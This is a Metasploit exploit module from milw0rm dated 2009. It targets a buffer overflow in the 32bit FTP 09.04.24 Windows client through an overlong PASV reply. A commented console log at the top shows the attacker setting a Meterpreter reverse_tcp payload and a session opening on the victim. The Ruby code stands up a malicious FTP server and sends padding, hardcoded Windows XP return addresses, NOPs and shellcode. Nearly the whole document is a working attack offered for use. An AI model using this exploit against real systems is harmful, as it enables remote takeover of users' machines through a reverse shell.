#msf > use exploit/windows/ftp/32bitftp_pasv_reply
#msf exploit(32bitftp_pasv) > set PAYLOAD windows/meterpreter/reverse_tcp 
#PAYLOAD => windows/meterpreter/reverse_tcp                               
#msf exploit(32bitftp_pasv) > set LHOST 192.168.1.2 
#LHOST => 192.168.1.2                               
#msf exploit(32bitftp_pasv) > exploit               
#[*] Exploit running as background job.             
#msf exploit(32bitftp_pasv) >                       
#[*] Handler binding to LHOST 0.0.0.0               
#[*] Started reverse handler                        
#[*] Server started.    
# Victim connecting to the malicious ftp server.                            
#[*] Transmitting intermediate stager for over-sized stage...(191 bytes)
#[*] Sending stage (2650 bytes)                                         
#[*] Sleeping before handling stage...                                  
#[*] Uploading DLL (75787 bytes)...                                     
#[*] Upload completed.                                                  
#[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.3:1137)

##
# $Id: 32bitftp_pasv_reply.rb 6528 2009-05-06 16:00:00Z  $
##
##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '32bit FTP (PASV) Reply Client Remote overflow Exploit',
			'Description'    => %q{
				This module exploits a buffer overflow in the 32bit FTP 09.04.24
				client that is triggered through an excessively long PASV reply command
			},
			'Author' 	 => [ 'His0k4 <his0k4.hlm[at]gmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6528 $',
			'References'     =>
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/8611' ],
					[ 'BID', '34838' ],
				],
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x0d\x20",
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed, 
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
				# Tested against xp SP3 english
					[ 'Windows XP SP3 English',	{ 'Ret' => 0x7c868667 }	], # jmp esp kernel32.dll
					[ 'Windows XP SP2 French',	{ 'Ret' => 0x7C82385D }	], # call esp kernel32.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mai 06 2009',
			'DefaultTarget'  => 0))

		register_options(
			[ 
				OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
				OptString.new('SRVNAME', [ true, "Welcome to the ... FTP Service", "Test" ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)	

		buffer = "220 Welcome to the " + datastore['SRVNAME'] + " FTP Service.\r\n"
		client.put(buffer)
	end
	
	def on_client_data(client)
	
	
		client.get_once

		user = "331 Please specify the password.\r\n"
		client.put(user)
		
		client.get_once
		pass = "230 Login successful.\r\n"
		client.put(pass)
		
		client.get_once
		pwd = "257 \"/\"\r\n"
		client.put(pwd)
		
		client.get_once
		type = "200 Switching to ASCII mode.\r\n"
		client.put(type)
				
		client.get_once
		pasv = "227 Entering Passive Mode ("
		pasv << rand_text_numeric(966)
		pasv << [target.ret].pack('V')
		pasv << make_nops(20)
		pasv << payload.encoded
		pasv << ")\r\n"
		
		client.put(pasv)
		
		handler(client)
		service.close_client(client)
	end
end

# milw0rm.com [2009-05-07]
